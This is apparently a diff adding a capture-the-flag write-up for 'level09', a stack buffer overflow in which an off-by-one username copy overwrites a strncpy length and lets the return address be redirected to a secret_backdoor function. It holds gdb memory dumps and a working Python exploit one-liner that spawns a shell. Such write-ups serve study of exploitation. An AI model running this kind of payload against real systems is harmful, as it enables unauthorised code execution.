@@ -1,0 +1,58 @@
+
+=> We have a buffer of 140 bytes 
+=> set_username() copy the first 41 bytes just after the buffer (buffer[140 + i])
+=> We need to run the program once to load the addresses (PIE protection)
+
+=> We can try to fill the first buffer
+=> we can't reach the ret addr of handle_msg with 41 bytes 
+
+=> We fill the first buffer (41 bytes at most) and it doesn't overwrite the ret of handle message
+0x7fffffffe5c0:	0x4141414141414141	0x4141414141414141
+0x7fffffffe5d0:	0x4141414141414141	0x4141414141414141
+0x7fffffffe5e0:	0x0000004141414141	0x00007fffffffe600
+0x7fffffffe5f0:	0x00007fffffffe600	0x0000555555554abd <- ret addr of handle_msg
+
+=> set_msg() copy a number of bytes to the buffer
+=> The number number of bytes copied with strncpy is a number at the address: (buffer + 180);
+
+=> We can access this value because set_username allow us to write until buffer[140 + 41]
+r < <(python -c 'print "A"*41 + "\n" + "B"*200')
+
+=> We break just before the strncpy and we can see that the value 65 (A) is used by the rdx register, which is the number of bytes copied
+
+   0x00005555555549c6 <+148>:	callq  0x555555554720 <strncpy@plt>
+
+Breakpoint 4, 0x00005555555549c6 in set_msg ()
+(gdb) i r
+rax            0x7fffffffe530	140737488348464
+rbx            0x0	0
+rcx            0x7fffffffe120	140737488347424
+rdx            0x41	65
+
+=> 65 bytes from the second input are copied in the buffer 
+=> Let's modify this value by the maximum byte \xff (255)
+
+0x7fffffffe5e0:	0x4242424242424242	0x4242424242424242
+0x7fffffffe5f0:	0x4242424242424242	0x000000000000000a <- ret addr handle_msg
+
+Program received signal SIGSEGV, Segmentation fault.
+0x000000000000000a in ?? ()
+
+=> We then have access to the ret addr of handle_msg 
+=> We will overwrite this address by the address of secret_backdoor function
+
+(gdb) i function secret_backdoor
+0x000055555555488c  secret_backdoor
+
+r < <(python -c 'print "A"*40 + "\xff\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"')
+
+=> We have a segfault but the shell is executed and looks like to execute the "BBBB..." command 
+...
+sh: 1: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB: not found
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000000000 in ?? ()
+
+-> It's because we have the NX protections enabled, just one command is executed
+(python -c 'print "A"*40 + "\xff\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"'; cat) | ./level09
+
